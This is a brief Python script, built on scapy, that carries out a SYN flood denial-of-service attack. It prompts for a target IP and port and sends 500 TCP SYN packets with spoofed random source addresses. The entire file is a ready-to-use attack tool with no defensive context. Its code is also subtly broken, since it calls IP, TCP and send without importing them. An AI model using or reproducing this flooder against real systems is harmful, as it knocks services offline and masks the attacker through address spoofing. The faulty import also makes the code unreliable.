import os
import sys
import random
from scapy.all import sniff, wrpcap

def random_ip():
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

def random_int():
    return random.randint(1000, 9000)

def syn_flood(dst_ip, dst_port, counter):
    total = 0
    print("Packets are being sent ...")
    
    for _ in range(counter):
        IP_Packet = IP(src=random_ip(), dst=dst_ip)
        TCP_Packet = TCP(
            sport=random_int(),
            dport=dst_port,
            flags="S",
            seq=random_int(),
            window=random_int()
        )

        send(IP_Packet / TCP_Packet, verbose=0)
        total += 1

    print(f"\nTotal packets sent: {total}")

def main():
    try:
        dst_ip = input("Input a target IP: ")
        if not dst_ip:
            raise ValueError("We need a target IP to run the attack against!")

        dst_port = int(input("Input a target port: "))
        counter = 500
        syn_flood(dst_ip, dst_port, counter)
    except ValueError as e:
        print(f"Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
